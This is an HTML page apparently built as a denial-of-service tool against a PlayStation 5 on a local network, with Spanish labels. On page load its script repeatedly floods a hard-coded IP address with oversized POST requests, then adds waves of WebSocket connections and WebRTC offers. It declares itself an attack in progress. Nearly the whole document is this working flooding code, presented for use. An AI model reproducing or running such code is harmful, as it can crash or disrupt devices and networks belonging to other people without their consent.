<!DOCTYPE html>
<html>
<head>
    <title>PS5 Ethernet Bruteforce</title>
    <style>
        body {
            background-color: #000;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
        }
    </style>
</head>
<body>
    <h1>PS5 Ethernet Bruteforce Stress</h1>
    <div id="status">Preparando...</div>

    <script>
        const PS5_IP = "192.168.137.200"; // IP de la PS5

        function floodFetch() {
            for (let i = 0; i < 1000; i++) {
                try {
                    fetch(`http://${PS5_IP}/crash_me_${Math.random()}`, {
                        method: 'POST',
                        headers: {
                            'X-Payload': 'A'.repeat(50000),
                        },
                        body: 'B'.repeat(100000),
                        mode: 'no-cors',
                        cache: 'no-store',
                        keepalive: true,
                    }).catch(() => {});
                } catch (e) {}
            }
        }

        function floodWebSocket() {
            for (let i = 0; i < 100; i++) {
                try {
                    let ws = new WebSocket(`ws://${PS5_IP}/crazy_socket_${Math.random()}`);
                    ws.onerror = () => {}; // Ignorar errores
                } catch (e) {}
            }
        }

        function floodWebRTC() {
            for (let i = 0; i < 50; i++) {
                try {
                    let pc = new RTCPeerConnection({
                        iceServers: [{ urls: `stun:${PS5_IP}:3478` }]
                    });

                    pc.createDataChannel("crash" + Math.random());
                    pc.createOffer().then(offer => {
                        return pc.setLocalDescription(offer);
                    }).catch(() => {});
                } catch (e) {}
            }
        }

        function startAttack() {
            document.getElementById('status').textContent = "Ataque en curso contra " + PS5_IP;

            setInterval(floodFetch, 300);
            setInterval(floodWebSocket, 1000);
            setInterval(floodWebRTC, 500);
        }

        window.onload = startAttack;
    </script>
</body>
</html>
